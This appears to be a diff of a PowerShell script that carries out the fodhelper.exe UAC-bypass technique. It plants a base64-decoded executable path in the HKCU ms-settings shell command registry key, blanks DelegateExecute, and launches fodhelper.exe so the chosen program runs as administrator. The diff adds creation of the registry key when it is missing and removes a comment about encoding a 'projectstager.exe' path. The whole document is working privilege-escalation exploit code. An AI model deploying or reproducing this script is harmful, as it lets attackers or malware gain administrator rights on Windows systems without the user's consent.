@@ -1,6 +1,4 @@
-# Use this to encode the encoded path variable [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes("c:\users\polly.lu\downloads\projectstager.exe")).  In this example it uses cmd.exe
-
- # Define the registry key path
+# Define the registry key path
 $REG_KEY = "HKCU:\Software\Classes\ms-settings\Shell\Open\command"
 
 # Base64 encoded filename - you need to encode filename
@@ -11,6 +9,11 @@ $RUN123 = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64Str
 
 # Pause for 2 seconds
 Start-Sleep -Seconds 2
+
+# Check if the registry path exists; if not, create it
+if (!(Test-Path $REG_KEY)) {
+    New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Name "command" -Force | Out-Null
+}
 
 # Add the DelegateExecute registry value with an empty string
 Set-ItemProperty -Path $REG_KEY -Name "DelegateExecute" -Value "" -Force
@@ -25,5 +28,6 @@ Set-ItemProperty -Path $REG_KEY -Name "(Default)" -Value $RUN123 -Force
 Start-Sleep -Seconds 1
 
 # Execute fodhelper.exe, effectively running the command as admin
-Start-Process "fodhelper.exe" 
+Start-Process "fodhelper.exe"
+
 
